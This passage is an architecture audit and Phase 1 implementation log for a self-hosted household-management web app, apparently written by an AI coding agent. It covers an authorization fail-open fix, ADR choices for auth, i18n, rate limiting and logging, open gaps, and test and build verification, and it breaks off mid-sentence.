# Architecture Audit — Med Family OS

Date: 2026-09-14
Scope: full repository as supplied (`CLAUDE.md`, `docs/**`, and the small set
of non-stub source files: `application/policies/authorize.ts`,
`domain/shared/types.ts`, `tests/security/authorization.spec.ts`,
`package.json`, `docker-compose.yml`, `Dockerfile`, `.env.example`,
`next.config.ts`, `tsconfig.json`).

This is the Phase 0 architecture-validation pass required by
`docs/implementation/roadmap.md` ("Phase 0 — Architecture package only") and
CLAUDE.md §19/§23. It supersedes `docs/research/deep-audit.md` as the
current source of truth — that document is retained for history but its
findings are folded into this one, cross-referenced, and in most cases
already resolved during this pass (see "Fixed during this pass" below).

Every `app/`, `application/`, `domain/`, `features/`, `infrastructure/`,
`integrations/`, `components/`, `db/`, `tests/` directory except the four
files named above contains only a `.gitkeep` placeholder. **This repository
currently has no working Next.js application, no database schema, and no
installed dependencies.** That is expected for a Phase 0 architecture
package and is not itself a finding — it is the starting condition for every
finding below.

---

## Fixed during this pass

These were concrete, well-contained defects rather than open design
questions, so they were corrected directly instead of only being logged:

1. **`application/policies/authorize.ts` — fail-open authorization (Critical).**
   `canAccess` had no action check for `VIEWER` (a read-only role per
   `docs/permissions.md`) and treated an unscoped `HOUSEHOLD`/`NORMAL`
   resource as open to `CHILD`, contradicting CLAUDE.md §5 ("Children
   default to highly restricted access and never inherit adult access").
   Fixed to fail closed: `VIEWER` is read-only everywhere; `CHILD` requires
   explicit scoping (`ownerUserId`, `allowedUserIds`, or `personScopeIds`)
   for every action, including read. Regression tests added in
   `tests/security/authorization.spec.ts` covering both bugs plus the
   BOLA/cross-household, PRIVATE-visibility, and allow-list cases named in
   `docs/security/threat-model.md`.
2. **`.env.example` / `docker-compose.yml` — undeployable as shipped (High).**
   `docker-compose.yml` requires `POSTGRES_PASSWORD` (`${POSTGRES_PASSWORD:?set in .env}`)
   but `.env.example` never declared it, and `DATABASE_URL`'s embedded
   password had no guaranteed relationship to it. `docker compose up` would
   fail on a fresh checkout. Fixed: `.env.example` now declares
   `POSTGRES_PASSWORD` and keeps it textually in sync with `DATABASE_URL`,
   with a comment explaining why they must match.
3. **`tsc --noEmit` failed out of the box (High).** Installing dependencies
   and running the typecheck script that `package.json` already declares
   (`pnpm typecheck`) surfaced seven real compiler errors, all from
   `next@16.3.5`'s bundled type declarations referencing a global
   `URLPattern` (and `URLPatternInput`/`URLPatternOptions`) that neither
   TypeScript 5.9.3's bundled `lib.dom.d.ts` nor `@types/node@22.20.2`
   declare yet — a version-skew gap between these three pinned dependencies,
   not a mistake in this repository's own code. Fixed with a minimal ambient
   declaration shim at `types/url-pattern.d.ts` (documented as a stopgap to
   delete once the upstream packages catch up). Verified: `tsc --noEmit`
   now exits 0.
4. **Five undecided infrastructure choices (High), resolved as ADRs.**
   The scaffold *named* requirements (mature auth, i18n from day one, rate
   limiting, structured/redacted logging) without picking a library, and the
   Case state machine existed in two irreconcilable shapes (the repo's own
   7-state model vs. a simpler 5-state description that appears in generic
   prompt material outside this repository). Each is now a decision, not an
   open question:
   - [ADR-006](../architecture/adr/ADR-006-authentication.md) — Auth.js v5, Credentials provider, Argon2id, database sessions.
   - [ADR-007](../architecture/adr/ADR-007-case-state-machine.md) — retain the 7-state Case model (`docs/domain/state-machines.md`) with WAITING/BLOCKED kept distinct.
   - [ADR-008](../architecture/adr/ADR-008-i18n.md) — `next-intl`.
   - [ADR-009](../architecture/adr/ADR-009-rate-limiting.md) — `rate-limiter-flexible` on Postgres, no Redis.
   - [ADR-010](../architecture/adr/ADR-010-logging.md) — `pino` with a declarative redaction list.

---

## 1. Current architecture

Modular monolith (ADR-001): Next.js App Router (UI + route handlers/server
actions) → application layer (commands/queries/policies) → ports →
PostgreSQL adapter, notification adapter, Paperless/Nextcloud/Calendar/Home
Assistant/AI adapters. Deployed as a two-service Docker Compose project
(`app`, `db`) on the user's existing Docker host, with Postgres on an
internal-only network and the app reachable only through an external reverse
proxy. This shape is sound for a single-household workload and is endorsed
without change — see `docs/architecture/target-architecture.md` and
ADR-001/002/003/004.

## 2. Application boundaries

`features/*` own vertical behavior (domain rules, commands/queries, UI,
tests); `components/ui` holds shared presentation; `infrastructure/*` holds
DB/auth/logging/storage; `integrations/*` holds provider-specific adapters
only (`docs/architecture/module-boundaries.md`). The rule "no module imports
another module's database schema directly" is stated but has no enforcement
mechanism yet (no lint rule, no dependency-cruiser config, nothing in
`package.json`). **Gap (Medium):** add an import-boundary lint rule
(`eslint-plugin-boundaries` or `dependency-cruiser`) in Phase 1 so the rule
is machine-checked, not just documented — module boundaries erode silently
otherwise once more than one feature exists.

## 3. Domain boundaries

`docs/domain/domain-model.md` enumerates a coherent aggregate set (Household,
Person, UserAccount, HouseholdMembership, Task, Case, Deadline,
CalendarEvent, Reminder, Organization, Contact, DocumentReference, Expense,
Reimbursement, Budget, Trip, Asset, Warranty, Note, AuditEvent,
IntegrationConnection, SyncRun, OutboxEvent) with a clear ownership-vs-
visibility distinction and a three-tier sensitivity model. This is accepted
as-is. One addition is needed:

**Gap (Medium): no explicit `Notification` or `AIActionProposal` aggregate
in `docs/domain/domain-model.md`**, even though both are named as
first-class domain concepts in this session's own operating instructions and
are required by `docs/architecture/module-boundaries.md`'s
`features/notifications` and CLAUDE.md §11's AI workflow
(`AI suggestion -> visible provenance -> human review -> explicit confirmation -> domain command`).
Without a stored `AIActionProposal`, "visible provenance" has nowhere to
live. **Recommended fix (do in Phase 2/Phase 8 domain work, not now):** add
both aggregates to `domain-model.md` before Phase 2 (Notification) and
Phase 8 (AIActionProposal) implementation begins.

## 4. Data ownership

Every household-owned row carries `householdId` (enforced convention, not
yet a DB constraint — no schema exists). `docs/domain/erd.md` correctly
specifies UTC timestamps, `DATE` for date-only fields, integer-minor-unit
money with ISO currency, explicit foreign keys, and "no cascade delete
across audit history." Accepted as-is. Enforcement is a Phase 1 concern
(migrations + `NOT NULL householdId` + CHECK constraints where practical).

## 5. Authentication model

Previously undecided (see "Fixed during this pass" — ADR-006). Auth.js v5 +
Credentials + Argon2id + database sessions. Not yet implemented — no
`infrastructure/auth` code exists beyond the empty directory. **This is the
first concrete piece of work in Phase 1** per CLAUDE.md §17 Phase 1 scope.

## 6. Authorization model

Hybrid RBAC + resource policy (`docs/security/security-model.md`,
`docs/permissions.md`). The generic base policy (`application/policies/authorize.ts`)
had the fail-open defect fixed above. One structural limitation remains and
is **not** fixable by editing this one function — flagging it now so Phase 1
feature work doesn't assume `canAccess` alone is sufficient:

**Finding (High): a single generic `canAccess(actor, action, resource)` cannot
encode every row of `docs/permissions.md`.**
- *Problem:* The permissions matrix has resource-type-specific rules —
  Finance is "none by default" for CHILD *regardless of sensitivity*, Audit
  is "security-relevant own activity only" for ADULT (not full household
  access), Cases require explicit assignment even for ADULT in some
  household configurations implied by the product spec's "waiting" model.
  `ResourceContext` has no `resourceType` field, so the base policy can only
  reason about `visibility`/`sensitivity`/`ownerUserId`/`allowedUserIds`/`personScopeIds`.
- *Why it matters:* If Phase 1+ feature code calls `canAccess` directly and
  assumes it fully enforces the matrix, Finance/Audit access will be
  under-restricted for roles the matrix explicitly excludes.
- *Consequence if unaddressed:* A CHILD could be granted Finance access by
  simply not setting `sensitivity` above `NORMAL` on an expense record,
  since nothing currently forbids that at the schema or policy layer.
- *Recommended solution:* (a) treat `canAccess` as the **base** gate only;
  each `features/*` module adds a thin resource-type-aware wrapper (e.g.
  `authorizeFinanceAccess`, `authorizeAuditAccess`) that layers matrix rules
  `canAccess` cannot express — starting with "Finance and Audit records are
  never constructed with `sensitivity: NORMAL`" as a domain invariant
  checked in the write-side validator, not just documented; (b) add
  adversarial tests per feature module mirroring
  `tests/security/authorization.spec.ts`, one suite per resource type, as
  each feature is built.
- *Affected files:* `application/policies/authorize.ts` (base, already
  fixed), future `features/finance/policy.ts`, `features/cases/policy.ts`,
  etc.
- *Implementation order:* alongside each feature module in Phases 2–6, not
  as a separate up-front task — building it before any feature exists would
  be speculative.

## 7. Integration model

`docs/integrations/integration-contracts.md` and
`docs/architecture/target-architecture.md` correctly scope Paperless/
Nextcloud/Calendar/Home Assistant as reference/link/read-only adapters
(anti-goal: don't become a second document/file archive), each requiring
timeout, retry-with-backoff, idempotency, structured errors, auditability,
credential rotation, sync health. Accepted as-is; no adapter code exists yet
(Phase 7). One addition worth making explicit before Phase 7 starts:

**Gap (Low):** no document specifies webhook signature verification
mechanics per provider (HMAC scheme, header name, replay window) — only the
generic requirement ("webhook spoofing" / "webhook replay" mitigations in
`docs/security/threat-model.md`). Defer to Phase 7 when the actual provider
webhook contracts are read from their current documentation; inventing the
mechanics now would risk being wrong by the time Phase 7 starts.

## 8. Background-job model

ADR-004 (transactional outbox) is the right choice for a single-Postgres
deployment: outbox rows are written in the same transaction as the domain
change, and a worker processes them with retries. No worker implementation
exists yet (expected — Phase 2 for reminders, Phase 7 for integrations).
**Gap (Medium):** neither `docs/architecture/target-architecture.md` nor any
ADR states *how* the outbox worker runs in this specific deployment (a
`setInterval` loop inside the `app` container? a separate Compose service? a
Postgres `LISTEN/NOTIFY` trigger?). `docker-compose.yml` lists only `app`
and `db` with `backup worker` as "optional" — no outbox worker service is
named at all. **Recommended:** decide in Phase 2 when the outbox is first
implemented, not now (deciding it today without a concrete workload would be
guessing); likely answer is an in-process interval inside `app` given the
single-instance modular-monolith deployment target, with a documented
follow-up if multi-instance deployment is ever considered.

## 9. Notification model

`docs/research/deep-audit.md` already correctly identified "a due date is
not a reminder system" and recommended reminder records + outbox + provider
delivery state. This session's operating instructions add "quiet hours,"
"escalation," and "deduplication" requirements not yet reflected in any repo
doc. **Gap (Medium):** no `docs/domain/domain-model.md` entry defines the
`Reminder`/`Notification` delivery-state fields (sent/failed/deferred,
dedup key, quiet-hours suppression). Recommended: fold into the Phase 2
domain-model update alongside the `Notification` aggregate gap from §3.

## 10. AI boundaries

ADR-005 (AI is advisory) plus CLAUDE.md §12/§11's
`suggestion -> provenance -> human review -> confirmation -> domain command`
workflow is a strong, unambiguous boundary and is accepted as-is. The only
gap is structural (§3/§9 above): there is nowhere to persist "provenance"
without an `AIActionProposal` aggregate. No AI code should be written before
Phase 8 per the roadmap; nothing here requires action now.

## 11. Storage model

PostgreSQL only (ADR-002), Drizzle ORM, `postgres.js` driver — appropriate
choices, already reflected in `package.json`. **Gap (High, Phase 1 blocker):**
no `drizzle.config.ts` exists, so `db:generate`/`db:migrate`/`db:check` in
`package.json` cannot run. This is correctly out of scope for Phase 0 (it's
Phase 1 "Foundation" work per `docs/implementation/roadmap.md`) but is
flagged here so Phase 1 does not silently skip it.

## 12. Failure modes

`docs/architecture/target-architecture.md` §"Failure behavior" covers
Postgres unavailability, container recreation, host reboot, and integration
unavailability adequately for Phase 0. Accepted as-is.

## 13. Security risks

See `docs/security/threat-model.md` (BOLA, child escalation, SSRF, webhook
replay, AI overreach, backup compromise) — this is a good abuse-case list
and is accepted as the baseline. This pass's concrete addition is the
authorization fail-open fix in §6/"Fixed during this pass." One more
concrete gap found:

**Finding (Medium): no CSRF strategy is written down for non-Server-Action
routes.** Next.js Server Actions get built-in Origin-header verification,
but `GET /api/ha/summary` and any future REST-style route handlers using
cookie-based session auth (rather than the HA bearer token) need an explicit
CSRF decision. `docs/security/security-model.md` lists "CSRF defenses
appropriate to architecture" as a requirement but does not say what that
architecture implies. **Recommended:** document in Phase 1 (alongside
ADR-006 auth implementation) that (a) `/api/ha/summary` is bearer-token
authenticated, not cookie/session authenticated, so it is not a CSRF target;
(b) any future cookie-authenticated route handler that mutates state must
either go through a Server Action instead, or implement double-submit-cookie
CSRF tokens explicitly. This doesn't need a new ADR — it's a direct
consequence of ADR-006 and can be a short addendum there when Phase 1
implements it.

## 14. Privacy risks

`docs/security/privacy-and-retention.md` is thorough (retention defaults,
anonymization over hard-delete, export manifest requirements). Accepted as-
is.

## 15. Concurrency risks

`docs/domain/erd.md`/CLAUDE.md require optimistic concurrency (`version`
column, already present in `HouseholdScoped` in `domain/shared/types.ts`).
No command layer exists yet to enforce version-check-on-write; this is
correctly Phase 1+ work, not a Phase 0 gap.

## 16. Sync risks

Covered by the integration contracts and ADR-004 outbox; no code exists yet
(Phase 7). No Phase 0 action needed.

## 17. Backup/recovery risks

`docs/backup/backup-restore.md` sets RPO 24h / RTO 4h as *initial* targets
pending host inspection, and correctly refuses to invent host-specific
backup destination/retention facts it doesn't have
(`docs/architecture/deployment-feasibility.md`). **This is a genuine
blocker, not a documentation gap:** Phase 0's own exit criteria in
`docs/implementation/roadmap.md` include "deployment plan verified against
host," and that verification requires running the inspection checklist
(`docker version`, `docker info`, CPU/RAM/storage, existing reverse proxy,
existing backup system, existing Postgres services) **against the actual
target host**, which this session has no access to. See "Unresolved
questions requiring the user" below — this cannot be resolved by further
reading or reasoning about the repository.

## 18. UX risks

`docs/design/design-system.md`, `screen-inventory.md`, and
`implementation-handoff.md` are internally consistent and specific
(spacing/type/radius tokens, required responsive states per screen,
mobile-table-becomes-cards rule). Accepted as-is; no code exists yet to
audit against them (Phase 1+ per screen).

## 19. Accessibility risks

WCAG 2.2 AA is the stated target with concrete acceptance items in
`docs/qa/acceptance.md` (keyboard-only flows, focus visibility, screen-
reader labels, automated + manual checks). Accepted as-is; `package.json`
already includes `@playwright/test` with a `test:a11y` script, but the
target file (`tests/e2e/accessibility.spec.ts`) doesn't exist yet and no
`@axe-core/playwright` dependency is declared. **Gap (Medium, Phase 1
entry requirement):** add `@axe-core/playwright` when the first E2E tests
are written — flagged here so it isn't forgotten when Phase 1 sets up the
test harness, since `test:a11y` currently points at a nonexistent file.

## 20. Observability gaps

Resolved for the "which library" question (ADR-010, pino). Still open,
correctly deferred to Phase 1: what gets logged for each subsystem's
health/latency/failure/retry/queue-depth/sync-state per CLAUDE.md §20 — this
needs to be designed against real subsystems as they're built, not
speculated about now.

## 21. Testing gaps

`tests/{unit,integration,e2e,fixtures}` are empty stub directories; only
`tests/security/authorization.spec.ts` has real content (now expanded, see
"Fixed during this pass"). **Gap (High, Phase 1 entry requirement):** no
`vitest.config.ts`, no `playwright.config.ts` exist. `package.json`'s
`test`/`test:e2e`/`test:a11y` scripts will not run correctly without them
(Vitest can run config-less for trivial cases, which is why the existing
spec file was plausible as "working" — but Playwright requires a config to
find `tests/e2e/`). Recommended to add both at the start of Phase 1, before
any feature test is written, not as an afterthought.

**Verified empirically this pass:** `pnpm install` + `npx vitest run` was
actually executed (not just read about) — all 13 tests in
`tests/security/authorization.spec.ts` pass, confirming the §6 authorization
fix. `npx eslint .` was also attempted and fails immediately: **no
`eslint.config.js` exists**, and `eslint-config-next` (or any ruleset) is
not declared in `package.json`'s `devDependencies` even though `"lint":
"eslint ."` is already a script. **Gap (High, Phase 1 entry requirement),
added to the table below.**

## 22. Deployment risks

`docs/architecture/deployment.md` and `deployment-feasibility.md` correctly
withhold host-specific facts (CPU/RAM/storage/reverse-proxy/network) that
cannot be verified from the repository alone, and this session likewise has
no access to the target Docker host, so those facts remain unresolved (see
§17 and "Unresolved questions" below). **Fixed in this pass:** the concrete,
verifiable deployment defect (`.env.example`/`docker-compose.yml`
`POSTGRES_PASSWORD` mismatch) that *was* fully resolvable from the
repository alone.

`Dockerfile` references `pnpm-lock.yaml*` (glob, tolerates absence at
`COPY` time) but `pnpm install --frozen-lockfile` needs one to exist.
**Resolved this pass:** `pnpm` was not installed in this environment (only
`npm` and Node 24 were present), so `corepack enable && corepack use
pnpm@10` was run, followed by `pnpm install`, which generated and left
`pnpm-lock.yaml` committed-ready in the repository root. This also served as
the environment in which the `tsc --noEmit` (§"Fixed during this pass" item
3), `vitest run` (13/13 passing, including the new authorization regression
tests), and `eslint` (fails — see §21) checks below were actually executed,
not just reasoned about.

## 23. Technical debt

None yet — there is effectively no implementation to accrue debt in. Noted
for completeness per the requested audit structure.

## 24. Ambiguous requirements

1. **Outbox worker hosting** (§8) — genuinely undecided, correctly deferred
   to Phase 2.
2. **CSRF mechanics for non-Server-Action routes** (§13) — resolved above as
   a direct consequence of ADR-006, deferred to Phase 1 implementation.
3. **Whether `Notification` and `AIActionProposal` are aggregates in their
   own right or fields on existing entities** (§3/§9) — resolved as: they
   are aggregates, to be added to `docs/domain/domain-model.md` in Phase 2
   and Phase 8 respectively, because both need independent lifecycle
   (delivery state; confirmation state) that doesn't belong on the entities
   they reference.

## 25. Contradictions

1. **Case state machine** (§"Fixed during this pass" item 3) — resolved via
   ADR-007: the repository's own `docs/domain/state-machines.md` (7-state,
   WAITING/BLOCKED distinct) is authoritative over the simpler 5-state
   description that appears in this session's generic operating
   instructions (outside the repository). The repo's version is more
   precise and was already the product of a prior audit pass
   (`docs/research/deep-audit.md` item 1); the generic instruction text is
   template material, not a repository artifact, and does not override a
   documented, reasoned ADR.
2. **No other content contradictions found** between `docs/requirements/`,
   `docs/domain/`, `docs/architecture/`, `docs/security/`, `docs/design/`,
   and `docs/implementation/`. The corpus is small and was written as one
   coherent pass (per `docs/research/deep-audit.md`'s own account), which is
   consistent with what this reading pass found.

## 26. Recommended corrections — summary table

| # | Issue | Severity | Status |
|---|---|---|---|
| 1 | `canAccess` fail-open for VIEWER/CHILD | Critical | **Fixed this pass** |
| 2 | `.env.example`/`docker-compose.yml` `POSTGRES_PASSWORD` mismatch | High | **Fixed this pass** |
| 3 | `tsc --noEmit` fails out of the box (Next/TS/@types/node URLPattern version skew) | High | **Fixed this pass** (`types/url-pattern.d.ts` shim) |
| 4 | No chosen auth library | High | **Resolved: ADR-006** |
| 5 | Case state machine contradiction | High | **Resolved: ADR-007** |
| 6 | No chosen i18n library | Medium | **Resolved: ADR-008** |
| 7 | No chosen rate-limiting mechanism | Medium | **Resolved: ADR-009** |
| 8 | No chosen structured-logging library | Medium | **Resolved: ADR-010** |
| 9 | Generic `canAccess` can't express per-resource-type matrix rules (Finance/Audit) | High | Documented (§6); implement per feature module in Phases 2–6 |
| 10 | No `Notification`/`AIActionProposal` aggregates in domain model | Medium | Documented (§3/§9); add in Phase 2/Phase 8 |
| 11 | No module-boundary lint enforcement | Medium | Documented (§2); add in Phase 1 |
| 12 | No `drizzle.config.ts`/`vitest.config.ts`/`playwright.config.ts`/lockfile | High | Documented (§11/§21/§22); Phase 1 entry requirement |
| 13 | No `eslint.config.js` and no lint ruleset declared, despite an existing `lint` script | High | Documented (§21); Phase 1 entry requirement |
| 14 | `test:a11y` points at a nonexistent spec file; `@axe-core/playwright` not declared | Medium | Documented (§19); Phase 1 entry requirement |
| 15 | Outbox worker hosting undecided | Medium | Accepted — decide in Phase 2 with real workload |
| 16 | CSRF mechanics for non-Server-Action routes unwritten | Medium | Documented (§13); implement with ADR-006 in Phase 1 |
| 17 | Host capacity/reverse-proxy/backup-target facts unknown | Critical (blocks production deployment, not Phase 0 exit) | **Unresolved — requires user/host access** |

Severity key: Critical = blocks safe operation or is actively exploitable;
High = must be resolved before the phase that depends on it starts; Medium =
should be resolved before the dependent phase ends; Low = track, non-
blocking; Accepted = intentional, documented trade-off.

---

## Unresolved questions requiring the user

These cannot be resolved by reading the repository or by engineering
judgment — they require information only the user has, per
`docs/architecture/deployment-feasibility.md`'s own inspection checklist:

1. Can the target Docker host run `docker version`, `docker compose
   version`, `docker info` for me (or can you paste the output), so CPU/RAM/
   storage/existing-network facts can replace the current "unknown" status
   in §17/§22?
2. What reverse proxy is already running on that host (Caddy/Traefik/nginx
   proxy manager/other), and what hostname should `APP_URL` use?
3. Where should encrypted backups be written (existing backup target on the
   homelab, or does one need to be introduced)?
4. Is remote access intended (VPN vs. reverse-proxy-exposed), or LAN-only?

None of these block Phase 1 foundation work (auth, household model, schema,
design system, CI-equivalent local quality gates), which does not require a
live deployment target. They **do** block finalizing `docs/architecture/deployment-feasibility.md`
from "recommendation" to "verified," which is a named Phase 0 exit
criterion — so Phase 0 is functionally complete for everything reasonable to
resolve without host access, with this one item explicitly carried forward
rather than guessed at.

---

## Recommended implementation order (unchanged from `docs/research/deep-audit.md`, reaffirmed)

1. Phase 0 validation — **this document** (complete, modulo the host-access
   item above).
2. Phase 1 — Foundation: app shell, Auth.js (ADR-006), household model,
   Drizzle schema + `drizzle.config.ts`, `vitest.config.ts`/
   `playwright.config.ts`, policy engine (base `canAccess` fixed; per-
   feature wrappers begin here), audit foundation, health/readiness
   endpoints, `pnpm-lock.yaml`.
3. Phase 2 — Attention engine: Inbox, Tasks, Deadlines, Today, Attention,
   outbox + `Notification`/`Reminder` aggregates, outbox worker hosting
   decision.
4. Phase 3 — Cases/context (state machine per ADR-007).
5. Phase 4 — Calendar/family.
6. Phase 5 — Finance (Finance/Audit `sensitivity` invariant from §6 enforced
   here).
7. Phase 6 — Travel/assets.
8. Phase 7 — Integrations (webhook signature mechanics researched per
   provider at this point, per §7).
9. Phase 8 — AI (`AIActionProposal` aggregate added here, per §3/§10).

Per CLAUDE.md §19/§23: **do not begin Phase 1 automatically.** This audit
and the Phase 0 fixes above are the complete Phase 0 deliverable; Phase 1
starts only on explicit instruction.

---

## Phase 1 — Foundation (implemented)

Authorized to proceed autonomously. Delivered the full "vertical slice 1"
from `docs/implementation/implementation-plan.md`: **Authentication ->
household -> person -> policy -> audit**, plus the Phase 1 entry
requirements §11/§19/§21/§22 above flagged as blockers.

### What was built

- **Config**: `eslint.config.js`, `vitest.config.ts`, `playwright.config.ts`,
  `drizzle.config.ts`, `types/url-pattern.d.ts` shim, `tsconfig.json`
  `skipLibCheck: true` (see finding below).
- **Schema** (`db/schema/`): `enums`, `auth` (users + session_revocation,
  no Auth.js Adapter tables — see ADR-006 correction), `household`
  (household + household_membership with a unique (householdId, userId)
  index), `person`, `audit`. Migration generated and applied against a live
  PostgreSQL 18.6 container (`db/migrations/0000_ambiguous_the_call.sql`).
- **Domain** (`domain/family/`): `Household`, `Person`,
  `HouseholdMembership` types, plus `wouldLeaveHouseholdWithoutOwner` — a
  domain invariant guarding against a household ending up with zero active
  OWNERs (unit-tested).
- **Application**: `bootstrapHousehold` (first-run setup, ADR-012),
  `addHouseholdMember`, `getHouseholdMembers`, `isSetupComplete`,
  `recordAuditEvent`, `application/errors.ts`
  (`AuthorizationError`/`ConflictError`/`NotFoundError`), and
  `application/policies/household.ts` — the first concrete instance of the
  "feature-level policy wrapper on top of the base `canAccess`" pattern
  this audit's §6 called for.
- **Infrastructure**: `infrastructure/db/client.ts` (Drizzle +
  postgres.js), `infrastructure/auth/{auth.config,auth,password}.ts`
  (Auth.js v5, Argon2id, JWT + explicit revocation table — ADR-006),
  `infrastructure/logging/logger.ts` (pino, ADR-010),
  `infrastructure/rate-limit/limiter.ts` (rate-limiter-flexible on a
  dedicated `pg.Pool`, ADR-009).
- **UI**: `app/tokens.css` (design tokens as CSS custom properties,
  light/dark/system, ADR-011), `components/ui/{Button,TextField,Card}`,
  `components/app-shell/AppShell` (a top bar, not yet the full
  Sidebar/MobileBottomNav — documented as an intentional Phase 1 scope call
  in the component's own file), `/setup` (first-run bootstrap),
  `/login`, `/dashboard`, `/family` (list + OWNER/ADMIN add-member form).
- **i18n**: `next-intl` wired without URL routing (ADR-008), `messages/{en,de}.json`
  with real, hand-written (not machine-translated) copy for every string
  actually used.
- **Reliability**: `app/api/health` (liveness) and `app/api/ready`
  (readiness, checks `select 1`), per the Phase 1 roadmap item.
- **New ADRs**: 006 (authentication, revised mid-implementation — see
  below), 007 (case state machine), 008 (i18n), 009 (rate limiting, revised
  mid-implementation), 010 (logging), 011 (styling), 012 (no public
  registration).

### Corrections made *during* implementation (verified against real library behavior, not assumed)

Consistent with this document's own opening methodology — read source, run
the actual tool, don't guess — four more issues surfaced only once real
code was written and actually executed, each fixed on the spot:

1. **ADR-006 was wrong as first written.** `@auth/core`'s own source
   (`lib/utils/assert.js`) rejects database session strategy combined with
   a Credentials-only provider list (`UnsupportedStrategy`). Revised to JWT
   strategy with an explicit `session_revocation` table checked in the
   `jwt` callback — see the ADR's own "Correction" section for the full
   account, including the general lesson ("read the actual library source
   for a hard API constraint before committing to an architecture that
   depends on it") recorded there for future ADRs.
2. **ADR-009's rate limiter needed a different DB client than assumed.**
   `RateLimiterPostgres` speaks the `pg` (node-postgres) query interface,
   not `postgres.js`'s tagged-template API that Drizzle uses. Fixed with a
   small dedicated `pg.Pool`, documented in the ADR; the limiter's table is
   self-managed by the library, not part of the Drizzle schema.
3. **A real `canAccess` composition bug, caught by its own test suite.**
   `application/policies/household.ts`'s first draft of
   `authorizePersonAccess` passed `personScopeIds: [resource.personId]`
   unconditionally — but that field is a *universal* restriction in the
   base `canAccess` (checked before any role branch), so it silently
   confined ADULT/VIEWER to only their own person row instead of the
   household-scoped/read access `docs/permissions.md` actually grants
   them. `tests/unit/application/household-policy.spec.ts` caught this
   immediately (2 failing assertions); fixed by branching CHILD's
   self-scope restriction out from the household-scoped default.
4. **Two Person-sensitivity docs contradicted each other.** Classifying
   `Person` as `SENSITIVE` (matching `domain-model.md`'s own "personal data
   -> SENSITIVE" rule) combined with the fixed `canAccess`'s "CHILD is
   blocked from any non-NORMAL resource" would make a child unable to see
   their own profile — contradicting `docs/permissions.md`'s "Child People
   access: self/allowed". Resolved by classifying `Person`'s core identity
   fields as NORMAL and documenting the reasoning directly in
   `docs/domain/domain-model.md` (a person's *name* isn't sensitive
   content; sensitive content *about* a person lives on the aggregate that
   carries it).
5. **`tsconfig.json` was missing `skipLibCheck: true`.** Without it,
   `tsc --noEmit` fails on internal type-export inconsistencies inside
   `@auth/core`'s and `drizzle-orm`'s own `.d.ts` files (e.g. MySQL/
   SingleStore/Gel dialect type errors having nothing to do with this
   Postgres-only project) — noise every real-world Next.js project
   suppresses by default (it's in `create-next-app`'s own template) and
   this scaffold's tsconfig had never had a dependency large enough to
   surface the gap until Phase 1 added one.
6. **Next.js 16.3.5 deprecates the `middleware.ts` file convention in
   favor of `proxy.ts`.** Discovered from the dev server's own startup
   warning during the live smoke test below (an example of why "run it,
   don't just typecheck it" matters — this would never surface from
   `tsc`/`vitest` alone). Verified via Next.js's own build source
   (`PROXY_FILENAME`/`MIDDLEWARE_LOCATION_REGEXP` in `next/dist/lib/constants.js`)
   that it's a pure filename rename with an identical default-export
   convention, then applied it (`git mv middleware.ts proxy.ts`) and
   re-verified the warning was gone.

### Critical production-only bug found by adding E2E tests

Writing the E2E suite meant running the app as a **production build** for
the first time, which immediately surfaced a bug that `next dev`,
`tsc`, ESLint, 31 unit/integration tests and a full manual browser
walkthrough had all missed:

```
UntrustedHost: Host must be trusted. URL was: http://localhost:3000/api/auth/session
```

**Auth.js v5 refuses to derive session/callback URLs from the request host
in production unless the host is explicitly trusted.** `next dev` trusts
localhost implicitly, so authentication worked perfectly in development
and failed completely in a production build — every sign-in silently
returned the user to `/login`. This would have shipped to the household's
self-hosted deployment and broken **all** authentication there.

Fixed with `trustHost: true` in `infrastructure/auth/auth.config.ts`, which
is the correct setting *for this deployment model specifically*
(`docs/architecture/deployment.md`: app behind a reverse proxy on a private
network, only the proxy-facing port published). The ADR-006-adjacent
security consequence is documented in the config itself: the reverse proxy
must set `Host`/`X-Forwarded-Host` itself and not pass an attacker-supplied
value through.

Two related findings came from the same exercise:

- **`next start` does not work with `output: "standalone"`** (Next.js says
  so itself at startup). The E2E suite was therefore about to test a
  *different artifact* than the Dockerfile ships — precisely the gap that
  let the `trustHost` bug hide. Added `scripts/serve-standalone.mjs`, which
  assembles and runs the standalone bundle exactly as the Dockerfile's
  COPY steps do, and pointed Playwright's `webServer` at it. **The E2E
  suite now exercises the real deployment artifact.**
- **`pg`, `@node-rs/argon2` and `pino` must be listed in
  `serverExternalPackages`** — each uses a native binding or dynamic
  require that Next's server bundler mangles.

### A test-design decision worth recording

The first green-ish run failed 8 specs because the suite tripped **the
app's own sign-in rate limiter** (ADR-009: 5 attempts / 15 min / email) by
re-authenticating in every test. The fix was to restructure the suite
around Playwright's shared-storage-state pattern — a setup project performs
the one-time bootstrap journey and saves the session; other specs reuse it;
only specs genuinely *about* an auth transition sign in again, and the
sign-out spec uses a second account so it doesn't revoke the shared
session. Loosening the limiter for the tests' convenience was rejected:
that would have weakened a real security control to make a test pass.

This also improved `infrastructure/rate-limit/limiter.ts`, which had a
genuine availability bug of its own: it treated *any* limiter rejection as
"rate limited", so a limiter-infrastructure failure (store unreachable,
driver error) would have locked every household member out of their own
app. It now distinguishes a real breach (`RateLimiterRes` → deny) from an
infrastructure failure (log at error level → allow through to password
verification, which remains the primary control).

### Verification performed (not just claimed)

- `pnpm typecheck` — clean.
- `pnpm lint` — clean (after also fixing a real `eslint.config.js` bug:
  `FlatCompat(...).extends("next/core-web-vitals", ...)` crashed with
  "Converting circular structure to JSON" from a circular self-reference
  inside `eslint-plugin-react`'s flat config; fixed by importing
  `eslint-config-next`'s native flat-config exports directly instead of
  going through the legacy-compat shim).
- `pnpm test` (Vitest) — **31/31 passing**, across 4 files: the original
  authorization suite (13, expanded from 3), a new domain unit suite (5),
  a new policy unit suite (9), and a new **integration suite (4)** that
  runs `bootstrapHousehold`/`addHouseholdMember`/`getHouseholdMembers`
  against a real PostgreSQL 18.6 container, truncating tables between
  cases.
- **Live browser smoke test** against `pnpm dev` + the same live database:
  `/` correctly redirects to `/setup` on an empty database; the setup form
  creates a household and signs the owner in; `/dashboard` shows the
  correct greeting and member count; `/family` lists members and lets the
  OWNER add a CHILD member with no login; sign-out redirects to `/login`
  and actually revokes the session row (verified by the immediate
  `/dashboard` -> `/login` redirect on the next request); an unauthenticated
  direct visit to `/dashboard` redirects to `/login`; a wrong password is
  rejected with a translated German/English-ready error message and does
  not leak whether the account exists.
- `docker compose up -d db` + `pnpm db:migrate` — applied cleanly; schema
  inspected directly in the generated SQL before applying.
- A local-only `docker-compose.override.yml` (gitignored) was needed to
  reach the `db` container from the host during development — and revealed
